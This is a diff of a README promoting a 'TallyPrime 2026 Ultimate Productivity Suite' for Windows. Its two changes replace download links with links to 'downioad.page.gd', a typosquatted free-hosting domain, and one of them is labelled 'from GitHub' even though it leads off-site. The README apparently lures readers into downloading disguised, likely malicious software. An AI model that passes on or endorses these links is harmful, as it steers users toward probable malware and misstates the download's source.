@@ -2,7 +2,7 @@
 
 This repository provides the TallyPrime 2026 Ultimate Productivity Suite, a comprehensive tool designed to enhance your TallyPrime experience on Windows. With advanced features and seamless integration, it's perfect for professionals seeking efficiency in accounting and data management, offering a reliable way to optimize your workflow in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ The tool checks for updates automatically upon launch. If an update is available
 
 For the latest version of the TallyPrime 2026 Ultimate Productivity Suite, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
